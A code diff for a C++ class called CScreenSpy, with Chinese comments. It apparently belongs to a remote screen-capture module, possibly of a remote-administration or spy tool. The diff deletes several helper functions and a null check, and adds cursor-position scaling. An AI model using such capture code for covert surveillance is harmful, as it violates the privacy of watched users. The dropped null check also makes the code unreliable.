@@ -103,19 +103,6 @@ CScreenSpy::~CScreenSpy()
 	m_RectBufferOffset = 0;
 }
 
-
-ULONG CScreenSpy::GetBISize()
-{
-	ULONG	ColorNum = m_ulbiBitCount <= 8 ? 1 << m_ulbiBitCount : 0;
-
-	return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
-}
-
-LPBITMAPINFO CScreenSpy::GetBIData()
-{
-	return m_BitmapInfor_Full;  
-}
-
 LPBITMAPINFO CScreenSpy::ConstructBI(ULONG ulbiBitCount, 
 									 ULONG ulFullWidth, ULONG ulFullHeight)
 {
@@ -152,19 +139,9 @@ LPVOID CScreenSpy::GetFirstScreenData()
 	return m_BitmapData_Full;  //内存
 }
 
-
-ULONG CScreenSpy::GetFirstScreenLength()
-{
-	return m_BitmapInfor_Full->bmiHeader.biSizeImage; 
-}
-
+// 算法+光标位置+光标类型
 LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
 {
-	if (m_RectBuffer == NULL)
-	{
-		return NULL;
-	}
-
 	// 重置rect缓冲区指针
 	m_RectBufferOffset = 0;  
 
@@ -174,6 +151,8 @@ LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
 	// 写入光标位置
 	POINT	CursorPos;
 	GetCursorPos(&CursorPos);
+	CursorPos.x /= m_wZoom;
+	CursorPos.y /= m_hZoom;
 	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
 
 	// 写入当前光标类型
@@ -196,13 +175,6 @@ LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
 	}
 
 	return NULL;
-}
-
-
-VOID CScreenSpy::WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength)
-{
-	memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);   
-	m_RectBufferOffset += ulLength;
 }
 
 
